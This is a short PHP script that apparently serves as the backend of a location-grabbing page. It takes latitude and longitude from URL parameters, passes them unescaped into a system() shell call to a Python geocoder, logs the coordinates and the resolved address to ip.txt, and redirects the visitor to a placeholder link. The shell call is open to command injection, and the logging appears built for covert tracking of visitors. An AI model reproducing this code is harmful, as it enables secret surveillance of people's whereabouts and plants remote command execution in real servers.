<?php
error_reporting(E_ALL);
$lat = $_GET['latitude'];
$long = $_GET['longitude'];
$command = "/usr/bin/python3 get_addr.py " . $_GET['latitude'] . " " . $_GET['longitude'];
$cmd = system($command);
file_put_contents("ip.txt", "Latitude : " . $lat . "\n" . "Longitude : " . $long . "\n" . "Address : " . $cmd . "\n", FILE_APPEND);
header('Location: LINK');
exit();
?>
